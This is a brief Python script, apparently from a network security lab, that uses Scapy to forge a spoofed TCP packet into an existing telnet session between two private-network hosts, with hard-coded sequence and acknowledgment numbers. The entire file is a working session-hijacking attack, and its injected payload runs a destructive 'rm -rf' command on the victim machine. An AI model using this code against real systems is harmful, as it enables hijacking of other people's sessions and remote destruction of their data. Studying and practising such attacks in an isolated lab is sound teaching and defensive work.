#!/usr/bin/env python3
from scapy.all import *
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=55912, dport=23, flags="A", seq=1984345331, ack=1470192712)
data = "cd /; rm -rf new.txt"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)